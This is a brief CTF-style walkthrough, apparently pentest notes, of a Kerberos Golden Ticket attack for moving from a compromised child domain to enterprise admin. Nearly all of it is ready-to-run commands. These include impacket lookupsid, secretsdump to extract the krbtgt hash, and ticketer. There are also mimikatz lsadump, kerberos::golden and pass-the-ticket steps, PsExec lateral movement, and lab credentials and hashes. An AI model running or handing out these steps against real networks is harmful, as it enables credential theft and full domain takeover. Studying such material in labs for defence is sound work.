# CTF: Golden Ticket Walkthrough

## Attack Scenario

Assume that you have two domains - one parent domain and subordinate domain(s). When you compromise the subordinate domain, you want to access to the parent or/and other domain(s). In this scenario, use a Golden ticket to get an enterprise admin access to the entire domain.&#x20;

## With Kali&#x20;

{% code overflow="wrap" %}
```bash
# Get Domain SID
python lookupsid.py ignite/Administrator:Ignite@987@192.168.1.105

# Get Krbtgt hash & domain name
python secretsdump.py administrator:Ignite@987@192.168.1.105 -outputfile krb -user-status

# Create a Golden Ticket
python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local raj # random user

# Import it into memory 
export KRB5CCNAME=/root/Tools/impacket/examples/raj.ccache

```
{% endcode %}

## Windows: Access with Golden Ticket now

{% code overflow="wrap" %}
```bash
# Mimikatz

# Extract the “domain Name, SID, krbtgt Hash”,
privilege::debug
lsadump::lsa /inject /name:krbtgt

# Create a Golden Ticket and access to other machines now
kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500 /ptt

# Get an new command prompt
misc::cmd

# Access to another machine 
PsExec64.exe \\192.168.1.105 cmd.exe
```
{% endcode %}

## Windows: Access with Golden Ticket later

{% code overflow="wrap" %}
```bash
# Create the Golden Ticket and save it as ticket.kirbi
kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500

# Import the ticket into memory 
kerberos::ptt ticket.kirbi
misc::cmd

# Access to other machines 
PsExec64.exe \\192.168.1.105 cmd.exe
```
{% endcode %}
